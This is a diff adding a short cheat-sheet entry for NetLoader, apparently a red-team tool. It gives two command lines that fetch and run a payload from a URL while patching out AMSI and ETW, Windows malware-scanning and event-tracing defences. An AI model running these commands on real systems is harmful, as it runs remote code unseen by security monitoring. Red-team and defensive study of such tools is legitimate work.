@@ -1,0 +1,7 @@
+% NetLoader (Flangvik)
+
+# load binary from URL with AMSI & ETW patching
+Loader.exe -path <url-to-payload>
+
+# load Loader from URL and then load binary from URL
+AssemblyLoad.exe <loader-url> -path <url-to-payload>
